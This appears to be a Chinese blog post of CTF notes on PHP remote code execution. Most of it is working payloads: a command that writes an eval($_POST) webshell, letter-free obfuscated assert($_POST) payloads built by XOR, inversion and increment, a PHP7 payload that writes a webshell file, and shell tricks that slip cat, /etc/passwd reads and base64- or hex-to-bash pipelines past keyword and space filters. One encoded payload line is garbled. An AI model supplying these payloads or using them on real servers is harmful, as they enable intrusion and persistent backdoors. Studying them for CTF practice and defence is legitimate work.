<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">linux：需要转义\$</span>  <span class="string">单引号包裹不需要转义，需要写入到有权限的目录。</span></span><br><span class="line"><span class="string">echo</span> <span class="string">&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span> <span class="string">&gt;</span> <span class="string">/var/www/html/upload/webshell.php</span></span><br></pre></td></tr></table></figure>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在没有回显的命令执行或是无法上传webshell；就需要反弹shell。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>云平台；交互页面；容器逃逸；</p>
<h3 id="绕过：-以下是转载内容"><a href="#绕过：-以下是转载内容" class="headerlink" title="绕过：(以下是转载内容)"></a>绕过：(以下是转载内容)</h3><ol>
<li><p>;</p>
</li>
<li><p>*/ ?通配符</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">fl*</span> <span class="string">利用*匹配任意</span> <span class="string">不行</span></span><br><span class="line"><span class="string">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span><span class="string">|</span> <span class="string">base64</span> <span class="string">-d</span> <span class="string">|</span> <span class="string">bash</span> <span class="string">也不行</span></span><br><span class="line"><span class="string">ca\t</span> <span class="string">fl\ag.php</span> <span class="string">不行</span></span><br><span class="line"><span class="string">cat</span> <span class="string">fl&#x27;&#x27;ag.php</span> <span class="string">不行</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>变量拼接：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">a=f;b=lag.php;cat</span> <span class="string">$a$b</span></span><br><span class="line"><span class="string">a=g;cat$IFS$1fla$a.php</span></span><br></pre></td></tr></table></figure>
<p>4.无字母rce</p>
</li>
</ol>
<p>利用各种非数字字母的字符，经过各种变换（异或取反自增），构造出单个的字母字符。然后把单个字符拼接成一个函数名，如assert，然后就可以动态执行了</p>
<p>1、异或^<br>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：1^1=0,1^0=1,0^1=1,0^0=0，简单的来说就是相同为零，不同为一，ascii码表见后面：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">a:&#x27;%40&#x27;^&#x27;%21&#x27;</span> <span class="string">;</span> <span class="string">s:&#x27;%7B&#x27;^&#x27;%08&#x27;</span> <span class="string">;</span> <span class="string">s:&#x27;%7B&#x27;^&#x27;%08&#x27;</span> <span class="string">;</span> <span class="string">e:&#x27;%7B&#x27;^&#x27;%1E&#x27;</span> <span class="string">;</span> <span class="string">r:&#x27;%7E&#x27;^&#x27;%0C&#x27;</span> <span class="string">;</span> <span class="string">t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span></span><br><span class="line"><span class="string">P:&#x27;%0D&#x27;^&#x27;%5D&#x27;</span> <span class="string">;</span> <span class="string">O:&#x27;%0F&#x27;^&#x27;%40&#x27;</span> <span class="string">;</span> <span class="string">S:&#x27;%0E&#x27;^&#x27;%5D&#x27;</span> <span class="string">;</span> <span class="string">T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span></span><br><span class="line"><span class="string">拼接起来：</span></span><br><span class="line"><span class="string">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);</span>  <span class="string">//</span> <span class="string">$_=assert</span></span><br><span class="line"><span class="string">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);</span>  <span class="string">//</span> <span class="string">$__=_POST</span></span><br><span class="line"><span class="string">$___=$$__;</span> <span class="string">//$___=$_POST</span></span><br><span class="line"><span class="string">$_($___[_]);//assert($_POST[_]);</span></span><br><span class="line"><span class="string">放到一排就是：</span></span><br><span class="line"><span class="string">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span></span><br></pre></td></tr></table></figure>
<p>2.取反<br>每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。<br>方法一</p>
<p>首先，我们想要构造的依然是assert($<em>POST[</em>])这条语句，和上面一样，我们先用php的取反符号~将字符串assert和_POST取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$_=~(%9E%8C%8C%9A%8D%8B);</span>    <span class="string">//这里利用取反符号把它取回来，$_=assert</span></span><br><span class="line"><span class="string">$__=~(%A0%AF%B0%AC%AB);</span>      <span class="string">//$__=_POST</span></span><br><span class="line"><span class="string">$___=$$__;</span>                   <span class="string">//$___=$_POST</span></span><br><span class="line"><span class="string">$_($___[_]);</span>                 <span class="string">//assert($_POST[_]);</span></span><br><span class="line"><span class="string">放到一排就是：</span></span><br><span class="line"><span class="string">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);</span></span><br></pre></td></tr></table></figure>
<p>方法二</p>
<p>方法二是我看p神博客才了解到的方法，就是说利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，然后再进行一次取反操作，就能得到一个我们想要的字符，这里的原理我确实是不知道，因为这里好像是涉及到计组知识而我现在还没学，害，现在就只有先学会怎么用，原理后面再补了</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$_++;</span>                <span class="string">//得到1，此时$_=1</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;极&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$___</span> <span class="string">=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;区&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="string">$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;皮&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;十&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;勺&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="string">$____</span> <span class="string">=</span> <span class="string">&#x27;_&#x27;</span><span class="string">;</span>          <span class="string">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;寸&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;小&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;欠&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="string">$__</span> <span class="string">=</span> <span class="string">&quot;立&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);</span>   <span class="string">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="string">$_</span> <span class="string">=</span> <span class="string">$$____;</span>           <span class="string">//$_</span> <span class="string">=</span> <span class="string">$_POST</span></span><br><span class="line"><span class="string">$___($_[_]);</span>           <span class="string">//assert($_POST[_])</span></span><br><span class="line"><span class="string">放到一排就是：</span></span><br><span class="line"><span class="string">$_++;$__</span> <span class="string">=</span> <span class="string">&quot;极&quot;</span><span class="string">;$___</span> <span class="string">=</span> <span class="string">~($__&#123;$_&#125;);$__</span> <span class="string">=</span> <span class="string">&quot;区&quot;</span><span class="string">;$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$__</span> <span class="string">=</span> <span class="string">&quot;皮&quot;</span><span class="string">;$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$__</span> <span class="string">=</span> <span class="string">&quot;十&quot;</span><span class="string">;$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$__</span> <span class="string">=</span> <span class="string">&quot;勺&quot;</span><span class="string">;$___</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$____</span> <span class="string">=</span> <span class="string">&#x27;_&#x27;</span><span class="string">;$__</span> <span class="string">=</span> <span class="string">&quot;寸&quot;</span><span class="string">;$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$__</span> <span class="string">=</span> <span class="string">&quot;小&quot;</span><span class="string">;$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$__</span> <span class="string">=</span> <span class="string">&quot;欠&quot;</span><span class="string">;$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$__</span> <span class="string">=</span> <span class="string">&quot;立&quot;</span><span class="string">;$____</span> <span class="string">.=</span> <span class="string">~($__&#123;$_&#125;);$_</span> <span class="string">=</span> <span class="string">$$____;$___($_[_]);</span></span><br><span class="line"><span class="string">url：%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20&#x27;_&#x27;%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span></span><br></pre></td></tr></table></figure>
<h3 id="3、自增"><a href="#3、自增" class="headerlink" title="3、自增"></a>3、自增</h3><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p>
<p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
<p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$_=[];</span></span><br><span class="line"><span class="string">$_=@&quot;$_&quot;;</span> <span class="string">//</span> <span class="string">$_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="string">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];</span> <span class="string">//</span> <span class="string">$_=$_[0];</span></span><br><span class="line"><span class="string">$___=$_;</span> <span class="string">//</span> <span class="string">A</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="string">$___.=$__;</span> <span class="string">//</span> <span class="string">S</span></span><br><span class="line"><span class="string">$___.=$__;</span> <span class="string">//</span> <span class="string">S</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;</span> <span class="string">//</span> <span class="string">E</span> </span><br><span class="line"><span class="string">$___.=$__;</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span> <span class="string">//</span> <span class="string">R</span></span><br><span class="line"><span class="string">$___.=$__;</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span> <span class="string">//</span> <span class="string">T</span></span><br><span class="line"><span class="string">$___.=$__;</span></span><br><span class="line"></span><br><span class="line"><span class="string">$____=&#x27;_&#x27;;</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span> <span class="string">//</span> <span class="string">P</span></span><br><span class="line"><span class="string">$____.=$__;</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span> <span class="string">//</span> <span class="string">O</span></span><br><span class="line"><span class="string">$____.=$__;</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span> <span class="string">//</span> <span class="string">S</span></span><br><span class="line"><span class="string">$____.=$__;</span></span><br><span class="line"><span class="string">$__=$_;</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span> <span class="string">//</span> <span class="string">T</span></span><br><span class="line"><span class="string">$____.=$__;</span></span><br><span class="line"></span><br><span class="line"><span class="string">$_=$$____;</span></span><br><span class="line"><span class="string">$___($_[_]);</span> <span class="string">//</span> <span class="string">ASSERT($_POST[_]);</span></span><br><span class="line"><span class="string">url:%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xspan></span><br><span class="line"><span class="string">说实话真的太长了，要是稍微有个长度限制就用不了，所以说这种方法只做了解即可</span></span><br></pre></td></tr></table></figure>
<h2 id="php5和php7的区别"><a href="#php5和php7的区别" class="headerlink" title="php5和php7的区别"></a>php5和php7的区别</h2><p>在研究无数字字母rce的过程中，一个很重要的函数就是<code>assert</code>，但在php5的版本和php7的版本中，它是有一些区别的，我们上面的测试都是基于php5进行的，在php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码，在php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，但是在php7中，我们可以使用($a)()这种方法来执行命令，那相当于我们对phpinfo取反后就可以直接执行了，也可以选择file_put_contents()来写入shell，在php5中这样是不行的：</p>
<p><img src="https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013203950659-1076734112.png" alt="img"></p>
<h3 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h3><p>在php7中，因为可以使用($a)()这种方法来执行命令，所以说我们利用<code>call_user_func()</code>来举例，<code>(call_user_func)(system,whoami,&#39;&#39;)</code>即可执行<code>whoami</code>的命令：</p>
<p><img src="https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013204014313-712260497.png" alt="img"></p>
<p><em>那构造出来的结果就为：</em></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);</span></span><br></pre></td></tr></table></figure>
<h3 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a>例子二</h3><p>再来一个在php7中利用<code>file_put_contents()</code>写入<code>shell</code>的例子：</p>
<p><img src="https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013204058114-20364920.png" alt="img"></p>
<p> 我们要构造的语句为：<code>file_put_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code>构造出来就为：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));</span></span><br></pre></td></tr></table></figure>
<p>ascii码表。16进制</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240517153124863.png" alt="image-20240517153124863"></p>
<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><p>1.大括号</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">cat</span>,<span class="string">flag.php</span>&#125;</span><br></pre></td></tr></table></figure>
<p>2.$IFS代替空格</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$IFS$9，$&#123;IFS&#125;，$IFS这三个都行</span></span><br><span class="line"><span class="string">Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符</span> <span class="string">(internal</span> <span class="string">field</span> <span class="string">separator)。</span></span><br><span class="line"><span class="string">?cmd=ls$IFS-I</span></span><br><span class="line"><span class="string">单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名</span></span><br><span class="line"><span class="string">?cmd=ls$&#123;IFS&#125;-l</span></span><br><span class="line"><span class="string">$IFS$9后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</span></span><br><span class="line"><span class="string">?cmd=ls$&#123;IFS&#125;$9-l</span></span><br></pre></td></tr></table></figure>
<p>3.重定向字符&gt;,&lt;</p>
<p>4.%09绕过</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">就是tab键</span></span><br></pre></td></tr></table></figure>
<h2 id="文件名的过滤："><a href="#文件名的过滤：" class="headerlink" title="文件名的过滤："></a>文件名的过滤：</h2><p>1.？？，*绕过</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">/fl??</span></span><br><span class="line"><span class="string">cat</span> <span class="string">/f*</span>  <span class="comment">#多个匹配结果同时展现</span></span><br></pre></td></tr></table></figure>
<p>2.单引号，双引号，反引号绕过正则</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">/fl&quot;&quot;ag</span></span><br><span class="line"><span class="string">c&quot;&quot;at</span> <span class="string">/e&#x27;t&#x27;c/pas``s``wd</span> </span><br><span class="line"><span class="string">对php来说这是fl&quot;&quot;ag而不是flag关键字不会匹配上，但是对于linux系统来说cat</span> <span class="string">/fl&quot;&quot;ag等效于cat</span> <span class="string">/flag。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</span></span><br><span class="line"><span class="string">passthru(&#x27;cat</span> <span class="string">/fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</span></span><br></pre></td></tr></table></figure>
<p>3.反斜杠\绕过</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</span></span><br><span class="line"><span class="string">cat</span> <span class="string">fl\ag.p\hp</span></span><br></pre></td></tr></table></figure>
<p>4.特殊变量： $1到 $9,$@和$*</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">这些特殊变量输出为空</span></span><br><span class="line"><span class="string">cat</span> <span class="string">/fl$9ag</span></span><br><span class="line"><span class="string">或者可以在单词词尾加上$x</span> <span class="string">x是任意字母</span></span><br><span class="line"><span class="string">c$@at</span> <span class="string">/e$@tc/pas$@swd</span></span><br><span class="line"><span class="string">cat$x</span> <span class="string">/etc$x/passwd$x</span></span><br><span class="line"><span class="string">ca$@t</span> <span class="string">/etc$x/passwd$x</span></span><br></pre></td></tr></table></figure>
<p>5.内联执行绕过</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">a=c;b=a;c=t;$a$b$c</span> <span class="string">/1.txt</span></span><br><span class="line"><span class="string">a=f;c=a;d=g;b=l;cat</span> <span class="string">$a$b$c$d.php（abcd拼接出来flag）</span></span><br></pre></td></tr></table></figure>
<p>6.利用linux中的环境变量</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">echo</span> <span class="string">$PATH</span>              <span class="comment">#PATH默认系统环境变量</span></span><br><span class="line"><span class="string">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span></span><br><span class="line"><span class="string">echo</span> <span class="string">f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</span></span><br><span class="line"><span class="string">表示了flag.php</span></span><br></pre></td></tr></table></figure>
<h2 id="常见文件读取命令绕过"><a href="#常见文件读取命令绕过" class="headerlink" title="常见文件读取命令绕过"></a>常见文件读取命令绕过</h2><p>1.base64解码</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">flag.php--&gt;</span> <span class="string">Y2FOIGZSYWcucGhw</span></span><br><span class="line"><span class="string">echo</span> <span class="string">Y2FOIGZsYWcucGhw</span> <span class="string">|</span> <span class="string">base64</span> <span class="string">-d</span></span><br><span class="line"><span class="string">管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</span></span><br><span class="line"><span class="string">echo</span> <span class="string">Y2FOIGZsYWcucGhw</span> <span class="string">|</span> <span class="string">base64</span> <span class="string">-d</span> <span class="string">|</span> <span class="string">bash</span></span><br><span class="line"><span class="string">$(echo</span> <span class="string">Y2FOIGZsYWcucGhw</span> <span class="string">|</span> <span class="string">base64</span> <span class="string">-d)</span></span><br><span class="line"><span class="string">`echo</span> <span class="string">Y2FOIGZsYWcucGhw</span> <span class="string">|</span> <span class="string">base64</span> <span class="string">-d`</span>   <span class="comment">#反引号</span></span><br></pre></td></tr></table></figure>
<p>2.base32</p>
<p>3.HEX编码</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">tac</span> <span class="string">flag--&gt;</span> <span class="string">74616320666c6167</span></span><br><span class="line"><span class="string">echo</span> <span class="string">&quot;74616320666c6167”|xxd -r -p|bash</span></span><br><span class="line"><span class="string">xxd: 二进制显示和处理文件工具。</span></span><br><span class="line"><span class="string">-r-p将纯十六进制转储的反向输出打印为了ASCII格式</span></span><br><span class="line"><span class="string">bash、sh、/bin/bash、反引号等</span></span><br></pre></td></tr></table></figure>
<p>4.shellcode编码（16进制机器码）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="string">?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="string">?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="过滤cat读取命令"><a href="#过滤cat读取命令" class="headerlink" title="过滤cat读取命令"></a>过滤cat读取命令</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">flag.php</span> <span class="string">是用于在终端上显示当前目录下名为</span> <span class="string">flag.php</span> <span class="string">的文件的内容。</span></span><br><span class="line"><span class="string">cat</span> <span class="string">/flag</span> <span class="string">是用于在终端上显示根目录下名为</span> <span class="string">flag</span> <span class="string">的文件的内容。</span></span><br><span class="line"><span class="string">cat</span> <span class="string">flag</span> <span class="string">是用于在终端上显示当前目录下名为</span> <span class="string">flag</span> <span class="string">的文件的内容。</span></span><br></pre></td></tr></table></figure>
<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
<p>别的指令也同理</p>
<p>1.tac：反向显示，从最后一行往前</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">tac</span> <span class="string">/flag</span></span><br></pre></td></tr></table></figure>
<p>2.more：一页一页的展示</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">more</span> <span class="string">flag.php</span></span><br></pre></td></tr></table></figure>
<p>3.less：类似more</p>
<p>4.tail：查看末尾</p>
<p>5.nl：显示的时候输出行号</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">nl</span> <span class="string">/flag</span> <span class="string">和</span> <span class="string">nl</span> <span class="string">flag</span> <span class="string">是不同的。</span></span><br><span class="line"></span><br><span class="line"><span class="string">在</span> <span class="string">Linux</span> <span class="string">系统中，nl</span> <span class="string">命令用于给文件添加行号。当使用</span> <span class="string">nl</span> <span class="string">/flag</span> <span class="string">命令时，/flag</span> <span class="string">被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果</span> <span class="string">/flag</span> <span class="string">文件存在且有读取权限，那么</span> <span class="string">nl</span> <span class="string">/flag</span> <span class="string">将会给该文件的内容添加行号。</span></span><br><span class="line"></span><br><span class="line"><span class="string">而当使用</span> <span class="string">nl</span> <span class="string">flag</span> <span class="string">命令时，flag</span> <span class="string">被视为一个相对于当前目录的文件路径。也就是说，nl</span> <span class="string">flag</span> <span class="string">命令将会尝试在当前目录下找到名为</span> <span class="string">flag</span> <span class="string">的文件，并给其内容添加行号。（不过flag一般在根目录）</span></span><br></pre></td></tr></table></figure>
<p>6.od:以二进制方式读取，正常的od /flag输出的纯纯二进制，需要</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">passthru(&quot;od</span> <span class="string">-A</span> <span class="string">d</span> <span class="string">-c</span> <span class="string">/fla\g&quot;);</span></span><br></pre></td></tr></table></figure>
<p>7、xxd：读取二进制文件</p>
